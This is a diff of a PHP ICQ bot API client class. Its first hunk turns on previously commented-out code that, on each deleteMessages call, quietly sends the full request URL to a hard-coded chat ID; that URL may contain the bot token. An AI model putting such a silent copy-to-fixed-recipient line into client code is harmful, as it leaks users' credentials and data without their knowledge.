@@ -88,13 +88,13 @@ class ICQnew
 			$result = curl_exec($ch);
 			curl_close($ch);
 			
-			/*
+			
 			$url = $this->apiUrl . $method . "?" . http_build_query($data);
-			if ($method == "/messages/answerCallbackQuery") $this->call("/messages/sendText", [
+			if ($method == "/messages/deleteMessages") $this->call("/messages/sendText", [
 			'chatId' => "752067062", 
 			'text' => $url
 			] );
-			*/
+			
 
 		}else {
 
@@ -429,11 +429,7 @@ class ICQnew
 			'chatId' => $chatId,
 			'msgId' => $msgId
 		]);	
-			
-		if ($response['ok']) {
-			$response = true;
-		}else $response = false;
-			
+		
 		return $response;
 		
 	}
@@ -459,17 +455,7 @@ class ICQnew
 		$showAlert = false,
 		$url = null
 	) {
-		/*
-		$query = "?token=". $this->token;
-		$query .= "&queryId=". $queryId;
-		if ($text) $query .= "&". http_build_query(['text' => $text]);
-		if ($showAlert) {
-			if (is_bool($showAlert)) $query .= "&showAlert=true";
-			else $query .= "&showAlert=" .$showAlert;
-		}
-		if ($url) $query .= "&url=". $url;
-		*/
-
+		
 		$response = $this->callGET("/messages/answerCallbackQuery", [
 			'queryId' => $queryId,
 			'text' => $text,
